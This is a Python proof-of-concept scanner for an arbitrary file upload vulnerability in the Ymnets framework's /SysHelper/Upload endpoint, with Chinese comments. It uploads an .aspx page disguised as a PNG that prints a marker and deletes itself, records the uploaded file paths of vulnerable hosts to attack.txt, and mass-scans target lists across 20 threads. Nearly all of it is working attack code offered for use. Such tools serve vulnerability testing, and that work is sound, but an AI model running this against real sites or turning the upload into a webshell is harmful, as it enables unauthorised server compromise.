import requests
import concurrent.futures
import argparse

def check_vulnerability(target):

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryu178FOm4XGgDZqeX",
    }
    data = """------WebKitFormBoundaryu178FOm4XGgDZqeX
Content-Disposition: form-data; name="Filedata"; filename="2.aspx"
Content-Type: image/png

<%@Page Language="C#"%><%Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("YzI0YXQ=")));System.IO.File.Delete(Request.PhysicalPath);%>
------WebKitFormBoundaryu178FOm4XGgDZqeX--"""
    try:
        res = requests.post(f"{target}/SysHelper/Upload", headers=headers, data=data, timeout=5, verify=False)
        if res.status_code == 200 and res.text:
            response = res.json()
            if "aspx" in res.text:
                print(f"\033[1;32m[+]{target}存在文件上传漏洞..." + "\033[0m")
                with open("attack.txt", "a") as f:
                    f.write(f"{target}{response['FilePath']}\n")
                    f.close()
            else:
                print(f"\033[1;31m[-]{target} 不存在文漏洞" + "\033[0m")
        else:
            print(f"\033[1;31m[-]{target} 不存在文漏洞" + "\033[0m")
    except:
        print(f"\033[1;31m[-]{target}目标网站连接出错" + "\033[0m")


def banner():
    print("""  
 .----------------.  .----------------.  .-----------------. .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |  ____  ____  | || | ____    ____ | || | ____  _____  | || |  _________   | || |  _________   | || |    _______   | |
| | |_  _||_  _| | || ||_   \  /   _|| || ||_   \|_   _| | || | |_   ___  |  | || | |  _   _  |  | || |   /  ___  |  | |
| |   \ \  / /   | || |  |   \/   |  | || |  |   \ | |   | || |   | |_  \_|  | || | |_/ | | \_|  | || |  |  (__ \_|  | |
| |    \ \/ /    | || |  | |\  /| |  | || |  | |\ \| |   | || |   |  _|  _   | || |     | |      | || |   '.___`-.   | |
| |    _|  |_    | || | _| |_\/_| |_ | || | _| |_\   |_  | || |  _| |___/ |  | || |    _| |_     | || |  |`\____) |  | |
| |   |______|   | || ||_____||_____|| || ||_____|\____| | || | |_________|  | || |   |_____|    | || |  |_______.'  | |
| |              | || |              | || |              | || |              | || |              | || |    Bu0uCat   | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
                                                                                                        By:Bu0uCat
""")



if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="这是一个Ymnets框架文件上传检测程序")
    parser.add_argument("-u", "--url", type=str, help="需要检测的URL")
    parser.add_argument("-f","--file",type=str,help="指定批量检测文件")
    args = parser.parse_args()

    if args.url:
        banner()
        check_vulnerability(args.url)
    elif args.file:
        banner()
        f = open(args.file, 'r')
        targets = f.read().splitlines()
        #使用线程池并发执行检查漏洞
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(check_vulnerability, targets)
    else:
        banner()
        print("-u,--url 指定需要检测的URL")
        print("-f,--file 指定需要批量检测的文件")
